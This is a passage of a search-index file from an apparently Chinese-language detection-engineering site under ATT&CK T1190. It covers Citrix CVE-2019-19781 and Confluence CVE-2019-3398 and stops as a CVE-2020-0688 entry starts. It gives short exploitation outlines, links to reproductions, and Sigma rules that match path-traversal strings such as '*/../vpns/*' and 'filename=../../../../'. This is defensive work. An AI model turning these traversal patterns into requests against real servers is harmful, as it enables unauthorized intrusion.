u8fdb\u884cRCE\u6f0f\u6d1e\u8bd5\u63a2\uff0c\u4ece\u800c\u53d1\u8d77\u8fdb\u4e00\u6b65\u7cbe\u51c6\u653b\u51fb\u3002 \u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a Citrix NetScaler ADC and NetScaler Gateway version 10.5 Citrix ADC and NetScaler Gateway version 11.1 , 12.0 , 12.1 Citrix ADC and Citrix Gateway version 13.0 \u68c0\u6d4b\u65e5\u5fd7 HTTP.log \u6d4b\u8bd5\u590d\u73b0 \u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\uff1a 1.pl\u6587\u4ef6\u672a\u5bf9NSC_USER\u53c2\u6570\u4f20\u5165\u8fdb\u884c\u8fc7\u6ee4 2.\u89e6\u53d1\u76ee\u5f55\u7a7f\u8d8a 3.\u5728\u6a21\u677f\u76ee\u5f55\u7684XML\u6587\u4ef6\u5199\u5165\u547d\u4ee4 4.\u6a21\u677f\u5f15\u64ce\u5206\u6790\u540e\u6267\u884c\u547d\u4ee4 \u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a CVE-2019-19781 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/panisme/p/12542721.html Citrix\u8def\u5f84\u904d\u5386\uff08CVE-2019-19781\uff09 https://www.jianshu.com/p/03b175711524 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 \u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 title: \u68c0\u6d4bCitrix CVE-2019-19781\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a references: - https://www.jianshu.com/p/03b175711524 - https://www.jianshu.com/p/03b175711524 status: experimental logsource: category: webserver detection: selection: c-uri: - '*/../vpns/*' #\u6839\u636e\u6b64\u6b21\u516c\u5f00\u7684PoC\u663e\u793a\uff0c\u8be5\u6d1e\u76ee\u5f55\u904d\u5386\u88ab\u9650\u5236\u5b50\u5728vpns\u6587\u4ef6\u5939\u4e0b\uff0c\u4efb\u610f\u7528\u6237\u53ef\u901a\u8fc7HTTP\u8bf7\u6c42\u76f4\u63a5\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002 - '*/vpns/cfg/smb.conf' #\u6839\u636e\u6b64\u6b21\u516c\u5f00\u7684PoC\u663e\u793a\uff0c\u8be5\u6d1e\u76ee\u5f55\u904d\u5386\u88ab\u9650\u5236\u5b50\u5728vpns\u6587\u4ef6\u5939\u4e0b\uff0c\u4efb\u610f\u7528\u6237\u53ef\u901a\u8fc7HTTP\u8bf7\u6c42\u76f4\u63a5\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002 - '*/vpns/portal/scripts/*.pl*' #\u5229\u7528\u76ee\u5f55\u7a7f\u8d8a\u5199\u5165\u547d\u4ee4\u8bed\u53e5\u5230newbm.pl\u6587\u4ef6\u4e2d condition: selection fields: - client_ip - vhost - url - response falsepositives: - Unknown level: critical \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/","title":"T1190-CVE-2019-19781\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#t1190-cve-2019-19781","text":"","title":"T1190-CVE-2019-19781\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_1","text":"Citrix\u65d7\u4e0b\u591a\u6b3e\u4ea4\u4ed8\u63a7\u5236\u5668\u548c\u7f51\u5173\u5b58\u5728RCE\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u65e0\u9700\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u5c31\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u6839\u636e\u5176\u4ed6\u5b89\u5168\u7f51\u7ad9\u7684\u8bf4\u6cd5\uff0c\u8fd9\u4e2aRCE\u6f0f\u6d1e\u4f1a\u6709\u4e00\u4e2a\u6807\u8bb0\u6f0f\u6d1e\uff08\u5176\u4e2d\u4e4b\u4e00\u7684\u6807\u8bb0\uff09\uff0c\u5373\u672c\u6b21\u62a5\u9053\u7684Citrx\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff08CVE-2019-19781\uff09\u3002Citrx\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff08CVE-2019-19781\uff09\u5229\u7528\u65b9\u5f0f\u7684PoC\u5df2\u88ab\u516c\u5f00\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u590d\u6742\u6027\u4f4e\uff0c\u4e14\u65e0\u6743\u9650\u8981\u6c42\uff0c\u653b\u51fb\u8005\u53ea\u80fd\u904d\u5386vpns\u6587\u4ef6\u5939\uff0c\u4f46\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528Citrx\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u8fdb\u884cRCE\u6f0f\u6d1e\u8bd5\u63a2\uff0c\u4ece\u800c\u53d1\u8d77\u8fdb\u4e00\u6b65\u7cbe\u51c6\u653b\u51fb\u3002 \u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a Citrix NetScaler ADC and NetScaler Gateway version 10.5 Citrix ADC and NetScaler Gateway version 11.1 , 12.0 , 12.1 Citrix ADC and Citrix Gateway version 13.0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_2","text":"HTTP.log","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_3","text":"\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\uff1a 1.pl\u6587\u4ef6\u672a\u5bf9NSC_USER\u53c2\u6570\u4f20\u5165\u8fdb\u884c\u8fc7\u6ee4 2.\u89e6\u53d1\u76ee\u5f55\u7a7f\u8d8a 3.\u5728\u6a21\u677f\u76ee\u5f55\u7684XML\u6587\u4ef6\u5199\u5165\u547d\u4ee4 4.\u6a21\u677f\u5f15\u64ce\u5206\u6790\u540e\u6267\u884c\u547d\u4ee4 \u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a CVE-2019-19781 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/panisme/p/12542721.html Citrix\u8def\u5f84\u904d\u5386\uff08CVE-2019-19781\uff09 https://www.jianshu.com/p/03b175711524","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_4","text":"\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#sigma","text":"\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 title: \u68c0\u6d4bCitrix CVE-2019-19781\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a references: - https://www.jianshu.com/p/03b175711524 - https://www.jianshu.com/p/03b175711524 status: experimental logsource: category: webserver detection: selection: c-uri: - '*/../vpns/*' #\u6839\u636e\u6b64\u6b21\u516c\u5f00\u7684PoC\u663e\u793a\uff0c\u8be5\u6d1e\u76ee\u5f55\u904d\u5386\u88ab\u9650\u5236\u5b50\u5728vpns\u6587\u4ef6\u5939\u4e0b\uff0c\u4efb\u610f\u7528\u6237\u53ef\u901a\u8fc7HTTP\u8bf7\u6c42\u76f4\u63a5\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002 - '*/vpns/cfg/smb.conf' #\u6839\u636e\u6b64\u6b21\u516c\u5f00\u7684PoC\u663e\u793a\uff0c\u8be5\u6d1e\u76ee\u5f55\u904d\u5386\u88ab\u9650\u5236\u5b50\u5728vpns\u6587\u4ef6\u5939\u4e0b\uff0c\u4efb\u610f\u7528\u6237\u53ef\u901a\u8fc7HTTP\u8bf7\u6c42\u76f4\u63a5\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002 - '*/vpns/portal/scripts/*.pl*' #\u5229\u7528\u76ee\u5f55\u7a7f\u8d8a\u5199\u5165\u547d\u4ee4\u8bed\u53e5\u5230newbm.pl\u6587\u4ef6\u4e2d condition: selection fields: - client_ip - vhost - url - response falsepositives: - Unknown level: critical","title":"Sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-19781-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_7","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/","text":"T1190-CVE-2019-3398 Confluence\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b Confluence Server\u548cData Center\u5728downloadallattachments\u8d44\u6e90\u4e2d\u5b58\u5728\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u3002 \u5728Page\u6216Blogs\u5177\u6709\u6dfb\u52a0\u9644\u4ef6\u6743\u9650\u7684\u7528\u6237\uff0c\u6216\u5177\u6709\u521b\u5efa\u65b0\u7a7a\u95f4\u6216\u4e2a\u4eba\u7a7a\u95f4\u6743\u9650\u7684\u7528\u6237\uff0c\u6216\u5bf9\u67d0\u7a7a\u95f4\u5177\u6709\u201c\u7ba1\u7406\u5458\u201d\u6743\u9650\u7684\u7528\u6237\u53ef\u5229\u7528\u6b64\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u5c06\u6587\u4ef6\u5199\u5165\u4efb\u610f\u4f4d\u7f6e\u3002\u4e00\u5b9a\u6761\u4ef6\u4e0b\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a 2.0.0 <= version < 6.6.13 6.7.0 <= version < 6.12.4 6.13.0 <= version < 6.13.4 6.14.0 <= version < 6.14.3 6.15.0 <= version < 6.15.2 \u68c0\u6d4b\u65e5\u5fd7 HTTP.log \u6d4b\u8bd5\u590d\u73b0 \u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a \uff08\u73af\u5883\u642d\u5efa+\u590d\u73b0\uff09CVE-2019-3398 Confluence\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e https://blog.csdn.net/qq_40989258/article/details/105274370 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5\u3002\u76f4\u63a5\u5f15\u7528\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\u4e2d\u7684\u6848\u4f8b\u6570\u636e\u8fdb\u884c\u7279\u5f81\u63d0\u53d6\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 \u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 title: Confluence_CVE-2019-3398\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a\u68c0\u6d4b status: experimental description: \u68c0\u6d4bCVE-2019-3398\u4e2d\u63cf\u8ff0\u7684\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u7684\u5229\u7528\u884c\u4e3a references: - https://devcentral.f5.com/s/articles/confluence-arbitrary-file-write-via-path-traversal-cve-2019-3398-34181 - https://blog.csdn.net/qq_40989258/article/details/105274370 author: Florian Roth translator: 12306Bro date: 2020/05/26 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: cs-method: 'POST' c-uri|contains|all: - '/upload.action' - 'filename=../../../../' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ \uff08\u73af\u5883\u642d\u5efa+\u590d\u73b0\uff09CVE-2019-3398 Confluence\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e https://blog.csdn.net/qq_40989258/article/details/105274370","title":"T1190-CVE-2019-3398 Confluence\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#t1190-cve-2019-3398-confluence","text":"","title":"T1190-CVE-2019-3398 Confluence\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_1","text":"Confluence Server\u548cData Center\u5728downloadallattachments\u8d44\u6e90\u4e2d\u5b58\u5728\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u3002 \u5728Page\u6216Blogs\u5177\u6709\u6dfb\u52a0\u9644\u4ef6\u6743\u9650\u7684\u7528\u6237\uff0c\u6216\u5177\u6709\u521b\u5efa\u65b0\u7a7a\u95f4\u6216\u4e2a\u4eba\u7a7a\u95f4\u6743\u9650\u7684\u7528\u6237\uff0c\u6216\u5bf9\u67d0\u7a7a\u95f4\u5177\u6709\u201c\u7ba1\u7406\u5458\u201d\u6743\u9650\u7684\u7528\u6237\u53ef\u5229\u7528\u6b64\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u5c06\u6587\u4ef6\u5199\u5165\u4efb\u610f\u4f4d\u7f6e\u3002\u4e00\u5b9a\u6761\u4ef6\u4e0b\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a 2.0.0 <= version < 6.6.13 6.7.0 <= version < 6.12.4 6.13.0 <= version < 6.13.4 6.14.0 <= version < 6.14.3 6.15.0 <= version < 6.15.2","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_2","text":"HTTP.log","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_3","text":"\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a \uff08\u73af\u5883\u642d\u5efa+\u590d\u73b0\uff09CVE-2019-3398 Confluence\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e https://blog.csdn.net/qq_40989258/article/details/105274370","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_4","text":"\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5\u3002\u76f4\u63a5\u5f15\u7528\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\u4e2d\u7684\u6848\u4f8b\u6570\u636e\u8fdb\u884c\u7279\u5f81\u63d0\u53d6\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#sigma","text":"\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 title: Confluence_CVE-2019-3398\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a\u68c0\u6d4b status: experimental description: \u68c0\u6d4bCVE-2019-3398\u4e2d\u63cf\u8ff0\u7684\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u7684\u5229\u7528\u884c\u4e3a references: - https://devcentral.f5.com/s/articles/confluence-arbitrary-file-write-via-path-traversal-cve-2019-3398-34181 - https://blog.csdn.net/qq_40989258/article/details/105274370 author: Florian Roth translator: 12306Bro date: 2020/05/26 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: cs-method: 'POST' c-uri|contains|all: - '/upload.action' - 'filename=../../../../' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical","title":"Sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_7","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ \uff08\u73af\u5883\u642d\u5efa+\u590d\u73b0\uff09CVE-2019-3398 Confluence\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e https://blog.csdn.net/qq_40989258/article/details/105274370","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/","text":"T1190-CVE-2020-0688\u6f0f\u6d1e\u5229\u7528\u68c0\u6d4b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 